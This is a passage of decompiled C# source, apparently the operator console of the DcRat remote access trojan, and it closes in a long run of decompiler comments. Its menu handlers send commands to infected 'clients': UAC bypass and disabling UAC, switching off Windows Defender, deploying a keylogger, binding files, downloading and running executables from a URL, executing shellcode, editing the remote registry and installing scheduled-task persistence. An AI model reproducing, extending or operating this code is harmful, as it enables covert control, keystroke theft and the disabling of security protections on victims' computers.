			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			Clients[] selectedClients = GetSelectedClients();
			foreach (Clients clients in selectedClients)
			{
				if (clients.LV.get_SubItems().get_Item(lv_admin.get_Index()).get_Text() != "Administrator")
				{
					ThreadPool.QueueUserWorkItem(clients.Send, msgPack2.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void DisableUACToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Invalid comparison between Unknown and I4
		//IL_0100: Unknown result type (might be due to invalid IL or missing references)
		if (listView1.get_SelectedItems().get_Count() <= 0 || (int)MessageBox.Show((IWin32Window)(object)this, "Only for Admin.", "Disbale UAC", (MessageBoxButtons)4, (MessageBoxIcon)64) != 6)
		{
			return;
		}
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "disableUAC";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			Clients[] selectedClients = GetSelectedClients();
			foreach (Clients clients in selectedClients)
			{
				if (clients.LV.get_SubItems().get_Item(lv_admin.get_Index()).get_Text() == "Admin")
				{
					ThreadPool.QueueUserWorkItem(clients.Send, msgPack2.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void CompMgmtLauncherToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_00e7: Unknown result type (might be due to invalid IL or missing references)
		if (listView1.get_SelectedItems().get_Count() <= 0)
		{
			return;
		}
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "uacbypass2";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			Clients[] selectedClients = GetSelectedClients();
			foreach (Clients clients in selectedClients)
			{
				if (clients.LV.get_SubItems().get_Item(lv_admin.get_Index()).get_Text() != "Administrator")
				{
					ThreadPool.QueueUserWorkItem(clients.Send, msgPack2.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void DocumentToolStripMenuItem_Click(object sender, EventArgs e)
	{
		Process.Start("https://github.com/qwqdanchun/DcRat");
	}

	private void SettingToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		FormSetting formSetting = new FormSetting();
		try
		{
			((Form)formSetting).ShowDialog();
		}
		finally
		{
			((IDisposable)formSetting)?.Dispose();
		}
	}

	private void autoKeyloggerToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_004f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0055: Expected O, but got Unknown
		//IL_0104: Unknown result type (might be due to invalid IL or missing references)
		//IL_0186: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "sendMemory";
			msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes("Plugins\\Keylogger.exe")));
			msgPack.ForcePathObject("Inject").AsString = "";
			ListViewItem val = new ListViewItem();
			val.set_Text("Auto Keylogger:");
			val.get_SubItems().Add("0");
			val.set_ToolTipText(Guid.NewGuid().ToString());
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendMemory.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			if (listView4.get_Items().get_Count() > 0)
			{
				foreach (ListViewItem item in listView4.get_Items())
				{
					if (item.get_Text() == val.get_Text())
					{
						return;
					}
				}
			}
			Program.form1.listView4.get_Items().Add(val);
			Program.form1.listView4.AutoResizeColumns((ColumnHeaderAutoResizeStyle)1);
			getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), val.get_ToolTipText(), _admin: false));
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void SchtaskUninstallToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		if (listView1.get_SelectedItems().get_Count() <= 0)
		{
			return;
		}
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "schtaskuninstall";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			Clients[] selectedClients = GetSelectedClients();
			for (int i = 0; i < selectedClients.Length; i++)
			{
				ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void fakeBinderToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Invalid comparison between Unknown and I4
		//IL_00b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b9: Expected O, but got Unknown
		//IL_012e: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b0: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			OpenFileDialog val = new OpenFileDialog();
			if ((int)((CommonDialog)val).ShowDialog() != 1)
			{
				return;
			}
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "fakeBinder";
			msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(((FileDialog)val).get_FileName())));
			msgPack.ForcePathObject("Extension").AsString = Path.GetExtension(((FileDialog)val).get_FileName());
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			ListViewItem val2 = new ListViewItem();
			val2.set_Text("FakeBinder: " + Path.GetFileName(((FileDialog)val).get_FileName()));
			val2.get_SubItems().Add("0");
			val2.set_ToolTipText(Guid.NewGuid().ToString());
			if (listView4.get_Items().get_Count() > 0)
			{
				foreach (ListViewItem item in listView4.get_Items())
				{
					if (item.get_Text() == val2.get_Text())
					{
						return;
					}
				}
			}
			Program.form1.listView4.get_Items().Add(val2);
			Program.form1.listView4.AutoResizeColumns((ColumnHeaderAutoResizeStyle)1);
			getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), val2.get_ToolTipText(), _admin: false));
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void netstatToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_00dc: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Netstat.dll");
			Clients[] selectedClients = GetSelectedClients();
			foreach (Clients clients in selectedClients)
			{
				if ((FormNetstat)(object)Application.get_OpenForms().get_Item("Netstat:" + clients.ID) == null)
				{
					FormNetstat formNetstat = new FormNetstat();
					((Control)formNetstat).set_Name("Netstat:" + clients.ID);
					((Control)formNetstat).set_Text("Netstat:" + clients.ID);
					formNetstat.F = this;
					formNetstat.ParentClient = clients;
					((Control)formNetstat).Show();
					ThreadPool.QueueUserWorkItem(clients.Send, msgPack.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void fromUrlToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_00ec: Unknown result type (might be due to invalid IL or missing references)
		string text = Interaction.InputBox("\nInput Url here.\n\nOnly for exe.", "Url", "", -1, -1);
		if (string.IsNullOrEmpty(text) || listView1.get_SelectedItems().get_Count() <= 0)
		{
			return;
		}
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "downloadFromUrl";
			msgPack.ForcePathObject("url").AsString = text;
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			Clients[] selectedClients = GetSelectedClients();
			for (int i = 0; i < selectedClients.Length; i++)
			{
				ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void sendFileFromUrlToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a1: Expected O, but got Unknown
		//IL_0111: Unknown result type (might be due to invalid IL or missing references)
		//IL_0193: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string text = Interaction.InputBox("\nInput Url here.\n\nOnly for exe.", "Url", "", -1, -1);
			if (string.IsNullOrEmpty(text))
			{
				return;
			}
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "downloadFromUrl";
			msgPack.ForcePathObject("url").AsString = text;
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			ListViewItem val = new ListViewItem();
			val.set_Text("SendFileFromUrl: " + Path.GetFileName(text));
			val.get_SubItems().Add("0");
			val.set_ToolTipText(Guid.NewGuid().ToString());
			if (listView4.get_Items().get_Count() > 0)
			{
				foreach (ListViewItem item in listView4.get_Items())
				{
					if (item.get_Text() == val.get_Text())
					{
						return;
					}
				}
			}
			Program.form1.listView4.get_Items().Add(val);
			Program.form1.listView4.AutoResizeColumns((ColumnHeaderAutoResizeStyle)1);
			getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), val.get_ToolTipText(), _admin: false));
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void installSchtaskToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0066: Unknown result type (might be due to invalid IL or missing references)
		//IL_006c: Expected O, but got Unknown
		//IL_00d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_0152: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "autoschtaskinstall";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			ListViewItem val = new ListViewItem();
			val.set_Text("InstallSchtask:");
			val.get_SubItems().Add("0");
			val.set_ToolTipText(Guid.NewGuid().ToString());
			if (listView4.get_Items().get_Count() > 0)
			{
				foreach (ListViewItem item in listView4.get_Items())
				{
					if (item.get_Text() == val.get_Text())
					{
						return;
					}
				}
			}
			Program.form1.listView4.get_Items().Add(val);
			Program.form1.listView4.AutoResizeColumns((ColumnHeaderAutoResizeStyle)1);
			getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), val.get_ToolTipText(), _admin: false));
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void disableUACToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		//IL_0066: Unknown result type (might be due to invalid IL or missing references)
		//IL_006c: Expected O, but got Unknown
		//IL_00d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_0152: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "disableUAC";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			ListViewItem val = new ListViewItem();
			val.set_Text("DisableUAC:");
			val.get_SubItems().Add("0");
			val.set_ToolTipText(Guid.NewGuid().ToString());
			if (listView4.get_Items().get_Count() > 0)
			{
				foreach (ListViewItem item in listView4.get_Items())
				{
					if (item.get_Text() == val.get_Text())
					{
						return;
					}
				}
			}
			Program.form1.listView4.get_Items().Add(val);
			Program.form1.listView4.AutoResizeColumns((ColumnHeaderAutoResizeStyle)1);
			getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), val.get_ToolTipText(), _admin: true));
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void disableWDToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		//IL_0066: Unknown result type (might be due to invalid IL or missing references)
		//IL_006c: Expected O, but got Unknown
		//IL_00d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_0152: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "disableDefedner";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			ListViewItem val = new ListViewItem();
			val.set_Text("DisableDefedner:");
			val.get_SubItems().Add("0");
			val.set_ToolTipText(Guid.NewGuid().ToString());
			if (listView4.get_Items().get_Count() > 0)
			{
				foreach (ListViewItem item in listView4.get_Items())
				{
					if (item.get_Text() == val.get_Text())
					{
						return;
					}
				}
			}
			Program.form1.listView4.get_Items().Add(val);
			Program.form1.listView4.AutoResizeColumns((ColumnHeaderAutoResizeStyle)1);
			getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), val.get_ToolTipText(), _admin: true));
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void ConnectTimeout_Tick(object sender, EventArgs e)
	{
		Clients[] allClients = GetAllClients();
		if (allClients.Length == 0)
		{
			return;
		}
		Clients[] array = allClients;
		foreach (Clients clients in array)
		{
			if (Methods.DiffSeconds(clients.LastPing, DateTime.Now) > 20.0)
			{
				clients.Disconnected();
			}
		}
	}

	private void remoteRegeditToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_00dc: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Regedit.dll");
			Clients[] selectedClients = GetSelectedClients();
			foreach (Clients clients in selectedClients)
			{
				if ((FormRegistryEditor)(object)Application.get_OpenForms().get_Item("remoteRegedit:" + clients.ID) == null)
				{
					FormRegistryEditor formRegistryEditor = new FormRegistryEditor();
					((Control)formRegistryEditor).set_Name("remoteRegedit:" + clients.ID);
					((Control)formRegistryEditor).set_Text("remoteRegedit:" + clients.ID);
					formRegistryEditor.ParentClient = clients;
					formRegistryEditor.F = this;
					((Control)formRegistryEditor).Show();
					ThreadPool.QueueUserWorkItem(clients.Send, msgPack.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void normalInstallToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		if (listView1.get_SelectedItems().get_Count() <= 0)
		{
			return;
		}
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "normalinstall";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			Clients[] selectedClients = GetSelectedClients();
			for (int i = 0; i < selectedClients.Length; i++)
			{
				ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void normalUninstallToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		if (listView1.get_SelectedItems().get_Count() <= 0)
		{
			return;
		}
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "normaluninstall";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			Clients[] selectedClients = GetSelectedClients();
			for (int i = 0; i < selectedClients.Length; i++)
			{
				ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void justForFunToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_00dc: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Fun.dll");
			Clients[] selectedClients = GetSelectedClients();
			foreach (Clients clients in selectedClients)
			{
				if ((FormFun)(object)Application.get_OpenForms().get_Item("fun:" + clients.ID) == null)
				{
					FormFun formFun = new FormFun();
					((Control)formFun).set_Name("fun:" + clients.ID);
					((Control)formFun).set_Text("fun:" + clients.ID);
					formFun.F = this;
					formFun.ParentClient = clients;
					((Control)formFun).Show();
					ThreadPool.QueueUserWorkItem(clients.Send, msgPack.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void runShellcodeToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Invalid comparison between Unknown and I4
		//IL_00f0: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			OpenFileDialog val = new OpenFileDialog();
			try
			{
				val.set_Multiselect(false);
				((FileDialog)val).set_Filter("(*.bin)|*.bin");
				if ((int)((CommonDialog)val).ShowDialog() == 1)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "Shellcode";
					msgPack.ForcePathObject("Bin").SetAsBytes(File.ReadAllBytes(((FileDialog)val).get_FileName()));
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Miscellaneous.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					Clients[] selectedClients = GetSelectedClients();
					for (int i = 0; i < selectedClients.Length; i++)
					{
						ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
					}
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void noSystemToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_00d6: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "nosystem";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			Clients[] selectedClients = GetSelectedClients();
			foreach (Clients clients in selectedClients)
			{
				if (clients.LV.get_SubItems().get_Item(lv_user.get_Index()).get_Text()
					.ToLower() == "system")
				{
					ThreadPool.QueueUserWorkItem(clients.Send, msgPack2.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Expected O, but got Unknown
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bb: Expected O, but got Unknown
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Expected O, but got Unknown
		//IL_00c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d1: Expected O, but got Unknown
		//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dc: Expected O, but got Unknown
		//IL_00dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e7: Expected O, but got Unknown
		//IL_00e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f2: Expected O, but got Unknown
		//IL_00f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fd: Expected O, but got Unknown
		//IL_00fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0108: Expected O, but got Unknown
		//IL_0109: Unknown result type (might be due to invalid IL or missing references)
		//IL_0113: Expected O, but got Unknown
		//IL_0114: Unknown result type (might be due to invalid IL or missing references)
		//IL_011e: Expected O, but got Unknown
		//IL_011f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0129: Expected O, but got Unknown
		//IL_012a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0134: Expected O, but got Unknown
		//IL_0135: Unknown result type (might be due to invalid IL or missing references)
		//IL_013f: Expected O, but got Unknown
		//IL_0140: Unknown result type (might be due to invalid IL or missing references)
		//IL_014a: Expected O, but got Unknown
		//IL_014b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0155: Expected O, but got Unknown
		//IL_0156: Unknown result type (might be due to invalid IL or missing references)
		//IL_0160: Expected O, but got Unknown
		//IL_0161: Unknown result type (might be due to invalid IL or missing references)
		//IL_016b: Expected O, but got Unknown
		//IL_016c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0176: Expected O, but got Unknown
		//IL_0177: Unknown result type (might be due to invalid IL or missing references)
		//IL_0181: Expected O, but got Unknown
		//IL_0182: Unknown result type (might be due to invalid IL or missing references)
		//IL_018c: Expected O, but got Unknown
		//IL_018d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0197: Expected O, but got Unknown
		//IL_0198: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a2: Expected O, but got Unknown
		//IL_01a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ad: Expected O, but got Unknown
		//IL_01ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b8: Expected O, but got Unknown
		//IL_01b9: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c3: Expected O, but got Unknown
		//IL_01c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ce: Expected O, but got Unknown
		//IL_01cf: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d9: Expected O, but got Unknown
		//IL_01da: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e4: Expected O, but got Unknown
		//IL_01e5: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ef: Expected O, but got Unknown
		//IL_01f0: Unknown result type (might be due to invalid IL or missing references)
		//IL_01fa: Expected O, but got Unknown
		//IL_01fb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0205: Expected O, but got Unknown
		//IL_0206: Unknown result type (might be due to invalid IL or missing references)
		//IL_0210: Expected O, but got Unknown
		//IL_0211: Unknown result type (might be due to invalid IL or missing references)
		//IL_021b: Expected O, but got Unknown
		//IL_021c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0226: Expected O, but got Unknown
		//IL_0227: Unknown result type (might be due to invalid IL or missing references)
		//IL_0231: Expected O, but got Unknown
		//IL_0232: Unknown result type (might be due to invalid IL or missing references)
		//IL_023c: Expected O, but got Unknown
		//IL_023d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0247: Expected O, but got Unknown
		//IL_0248: Unknown result type (might be due to invalid IL or missing references)
		//IL_0252: Expected O, but got Unknown
		//IL_0253: Unknown result type (might be due to invalid IL or missing references)
		//IL_025d: Expected O, but got Unknown
		//IL_025e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0268: Expected O, but got Unknown
		//IL_0269: Unknown result type (might be due to invalid IL or missing references)
		//IL_0273: Expected O, but got Unknown
		//IL_0274: Unknown result type (might be due to invalid IL or missing references)
		//IL_027e: Expected O, but got Unknown
		//IL_027f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0289: Expected O, but got Unknown
		//IL_028a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0294: Expected O, but got Unknown
		//IL_0295: Unknown result type (might be due to invalid IL or missing references)
		//IL_029f: Expected O, but got Unknown
		//IL_02a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_02aa: Expected O, but got Unknown
		//IL_02ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_02b5: Expected O, but got Unknown
		//IL_02bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_02c6: Expected O, but got Unknown
		//IL_02cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_02d7: Expected O, but got Unknown
		//IL_02de: Unknown result type (might be due to invalid IL or missing references)
		//IL_02e8: Expected O, but got Unknown
		//IL_02e9: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f3: Expected O, but got Unknown
		//IL_02fa: Unknown result type (might be due to invalid IL or missing references)
		//IL_0304: Expected O, but got Unknown
		//IL_0305: Unknown result type (might be due to invalid IL or missing references)
		//IL_030f: Expected O, but got Unknown
		//IL_0310: Unknown result type (might be due to invalid IL or missing references)
		//IL_031a: Expected O, but got Unknown
		//IL_0321: Unknown result type (might be due to invalid IL or missing references)
		//IL_032b: Expected O, but got Unknown
		//IL_0332: Unknown result type (might be due to invalid IL or missing references)
		//IL_033c: Expected O, but got Unknown
		//IL_033d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0347: Expected O, but got Unknown
		//IL_0348: Unknown result type (might be due to invalid IL or missing references)
		//IL_0352: Expected O, but got Unknown
		//IL_0353: Unknown result type (might be due to invalid IL or missing references)
		//IL_035d: Expected O, but got Unknown
		//IL_035e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0368: Expected O, but got Unknown
		//IL_0369: Unknown result type (might be due to invalid IL or missing references)
		//IL_0373: Expected O, but got Unknown
		//IL_0374: Unknown result type (might be due to invalid IL or missing references)
		//IL_037e: Expected O, but got Unknown
		//IL_037f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0389: Expected O, but got Unknown
		//IL_038a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0394: Expected O, but got Unknown
		//IL_0395: Unknown result type (might be due to invalid IL or missing references)
		//IL_039f: Expected O, but got Unknown
		//IL_03a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_03aa: Expected O, but got Unknown
		//IL_03ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_03b5: Expected O, but got Unknown
